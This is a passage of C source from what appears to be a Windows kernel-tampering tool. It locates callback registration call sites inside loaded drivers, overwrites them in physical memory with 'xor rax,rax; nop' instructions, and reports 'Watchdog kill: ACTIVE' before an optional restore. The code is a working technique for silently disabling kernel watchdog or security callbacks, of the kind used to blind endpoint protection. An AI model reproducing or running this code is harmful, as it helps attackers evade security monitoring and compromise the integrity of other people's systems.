        for (int m = 1; m < g_nmods; m++) {
            if (_stricmp(g_mods[m].name, name) == 0) {
                drv_va   = g_mods[m].base;
                drv_size = g_mods[m].size;
                break;
            }
        }
        if (!drv_va) {
            printf("  %-30s  not in module list â€” skip\n\n", name);
            continue;
        }

        printf("  %-30s  VA=0x%016llX  size=0x%llX\n",
               name, (unsigned long long)drv_va, (unsigned long long)drv_size);

        printf("    Finding PA...\n");
        uint64_t drv_pa = find_driver_pa(name);
        if (!drv_pa) {
            printf("    PA not found â€” skip\n\n");
            continue;
        }

        int n = scan_driver(name, drv_pa, drv_va, drv_size);
        if (!n) printf("      (no registration calls found)\n");
        printf("    Total call sites in %s: %d\n\n", name, n);
        total_found += n;
    }

    if (!total_found) {
        printf("[5] No registration call sites found.\n");
        printf("    Possible: drivers compiled with static linking, or no watchdog.\n");
        goto done;
    }

    printf("=============================================================\n");
    printf("  Found %d registration call site(s) across all drivers.\n", total_found);
    printf("  Patching will prevent any re-registration attempt.\n");
    printf("  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto done;}
    printf("\n");

    /* Patch all call sites */
    printf("[7] Patching...\n\n");
    int patch_ok = 0, patch_fail = 0;
    for (int i = 0; i < g_n_sites; i++) {
        CallSite *s = &g_sites[i];
        if (phys_write(s->call_pa, FAKE_RETURN, CALL_LEN)) {
            /* Verify */
            uint8_t rb[6]={0};
            phys_read(s->call_pa, rb, 6);
            if (memcmp(rb, FAKE_RETURN, 6) == 0) {
                s->patched = 1;
                patch_ok++;
                printf("  [%3d] PA=0x%016llX  +0x%06llX  %-40s  PATCHED\n",
                       i+1,(unsigned long long)s->call_pa,
                       (unsigned long long)(s->call_va - s->drv_va),
                       s->func_name);
            } else {
                patch_fail++;
                printf("  [%3d] PA=0x%016llX  verify FAILED\n",
                       i+1,(unsigned long long)s->call_pa);
            }
        } else {
            patch_fail++;
            printf("  [%3d] PA=0x%016llX  write FAILED\n",
                   i+1,(unsigned long long)s->call_pa);
        }
    }
    printf("\n  Patched: %d  Failed: %d\n\n", patch_ok, patch_fail);

    if (patch_ok > 0) g_any_patched = 1;

    printf("[8] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    printf("=============================================================\n");
    printf("  Watchdog kill: ACTIVE\n\n");
    printf("  %d call site(s) patched to xor rax,rax; nopÃ—3\n",patch_ok);
    printf("  Re-registration attempts will return STATUS_SUCCESS\n");
    printf("  silently without registering any callback.\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar();

    /* Restore */
    printf("\n[9] Restoring...\n");
    restore_all();

    /* Verify */
    int v_ok=0,v_total=0;
    for(int i=0;i<g_n_sites;i++){
        uint8_t cur[6]={0}; v_total++;
        if(phys_read(g_sites[i].call_pa,cur,6)&&
           memcmp(cur,g_sites[i].orig,6)==0) v_ok++;
    }
    printf("    %d/%d call sites restored\n\n",v_ok,v_total);
    if(v_ok<v_total) printf("[!] Some not verified â€” reboot recommended\n\n");
    printf("[+] Done.\n");

done:
    CloseHandle(g_dev);
    return 0;
}
